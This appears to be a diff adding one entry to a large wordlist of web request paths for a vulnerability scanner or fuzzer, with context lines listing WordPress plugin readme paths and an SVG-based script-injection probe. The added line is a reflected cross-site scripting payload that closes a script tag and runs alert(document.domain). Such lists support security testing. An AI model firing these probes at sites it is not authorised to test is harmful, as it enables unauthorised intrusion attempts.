@@ -12309,3 +12309,4 @@ request?info=<svg onload=alert(
 /wp-admin/?action=postpass
 /wp-content/plugins/alt-monitoring/readme.txt
 /wp-content/plugins/audio-comments/readme.txt
+/?profile=</script><script>alert(document.domain)</script>
